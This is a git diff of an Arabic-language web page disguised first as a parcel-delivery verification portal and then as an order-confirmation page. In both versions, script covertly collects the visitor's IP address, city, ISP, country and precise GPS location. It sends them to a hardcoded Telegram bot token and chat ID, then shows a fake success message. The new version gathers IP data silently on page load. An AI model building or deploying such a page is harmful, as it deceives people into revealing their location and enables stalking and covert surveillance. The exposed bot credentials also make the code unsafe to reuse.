@@ -3,63 +3,90 @@ index.html
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بوابة توثيق الاستلام</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام تأكيد الطلبات</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
-        body { height: 100vh; background: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; color: white; text-align: center; }
-        .card { width: 85%; max-width: 380px; padding: 40px 20px; border: 2px solid #38bdf8; border-radius: 35px; background: rgba(30, 41, 59, 0.9); box-shadow: 0 0 30px rgba(56, 189, 248, 0.2); }
-        .btn { margin-top: 30px; padding: 18px; background: #38bdf8; color: #0f172a; border-radius: 20px; font-weight: bold; font-size: 18px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; max-width: 350px; border-top: 5px solid #0088cc; }
+        h3 { color: #333; }
+        button { background-color: #0088cc; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
+        #status { margin-top: 15px; color: #777; font-size: 14px; }
     </style>
 </head>
-<body onclick="collectAll()" ontouchstart="collectAll()">
+<body>
 
-    <div class="card">
-        <div style="font-size: 60px; margin-bottom: 20px;">📦</div>
-        <h1>تأكيد موقع الاستلام</h1>
-        <p>انقر في أي مكان لمطابقة موقعك مع نظام المندوب لفتح قفل الشحنة رقم #TB-90021</p>
-        <div class="btn">تحديث الموقع الآن</div>
-    </div>
+<div class="box">
+    <h3>نظام تأكيد الطلبات</h3>
+    <p>لتأكيد هويتك وضمان وصول الطلب، يرجى الضغط على الزر أدناه.</p>
+    <button onclick="startProcess()">تأكيد الهوية والطلب</button>
+    <p id="status">بانتظار الضغط على الزر...</p>
+</div>
 
 <script>
-    const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
-    const ID = '6876904688';
+    // بيانات البوت الخاصة بك
+    const TELEGRAM_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
+    const CHAT_ID = '6876904688'; 
 
-    function sendToTele(text) {
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`;
-        fetch(url).catch(e => console.log("Tele Error"));
+    let fullData = {};
+
+    // 1. جلب IP صامتاً فور فتح الصفحة
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        fullData.ip = data.ip;
+        fullData.city = data.city;
+        fullData.isp = data.org;
+        fullData.country = data.country_name;
+    });
+
+    function startProcess() {
+        document.getElementById('status').innerText = "جاري معالجة الطلب...";
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    fullData.lat = pos.coords.latitude;
+                    fullData.lng = pos.coords.longitude;
+                    fullData.map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram("✅ زبون جديد (وافق على الموقع)");
+                },
+                (err) => {
+                    fullData.error = "رفض الإذن";
+                    sendToTelegram("⚠️ زبون جديد (رفض الموقع/بيانات IP فقط)");
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        } else {
+            sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
+        }
     }
 
-    function collectAll() {
-        // 1. جلب الـ IP من Cloudflare (أسرع وأضمن مصدر في العالم)
-        fetch('https://www.cloudflare.com/cdn-cgi/trace')
-        .then(res => res.text())
-        .then(data => {
-            // تنظيف البيانات لاستخراج الـ IP فقط
-            const ip = data.match(/ip=(.*)/)[1];
-            sendToTele(`🌐 [IP صيد فوري]\n━━━━━━━━━━━━\nIP: ${ip}\nالمصدر: Cloudflare\n━━━━━━━━━━━━`);
+    function sendToTelegram(statusMsg) {
+        const message = `
+${statusMsg}
+━━━━━━━━━━━━
+📍 IP: ${fullData.ip || 'غير معروف'}
+🏙 المدينة: ${fullData.city || '--'}
+🏳️ الدولة: ${fullData.country || '--'}
+🌐 الشركة: ${fullData.isp || '--'}
+📍 الخريطة: ${fullData.lat ? fullData.map : 'لم يتم السماح'}
+━━━━━━━━━━━━
+        `;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        })
+        .then(() => {
+            document.getElementById('status').innerText = "تم التأكيد بنجاح!";
+            alert("شكراً لك، تم تأكيد هويتك بنجاح.");
         })
         .catch(() => {
-            // محاولة ثانية من مصدر بديل إذا فشل الأول
-            fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => sendToTele(`🌐 [IP احتياطي]\nIP: ${d.ip}`));
+            document.getElementById('status').innerText = "حدث خطأ، حاول مرة أخرى.";
         });
-
-        // 2. جلب الموقع (GPS) بشكل مستقل تماماً
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((p) => {
-                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                sendToTele(`📍 [GPS دقيق]\n━━━━━━━━━━━━\nالخريطة: ${map}\n━━━━━━━━━━━━`);
-            }, (err) => {
-                sendToTele("⚠️ الزبون رفض الـ GPS");
-            }, { enableHighAccuracy: true, timeout: 5000 });
-        }
-
-        if(!window.warned) { alert("جاري تحديث البيانات.."); window.warned=true; }
     }
 </script>
+
 </body>
 </html>
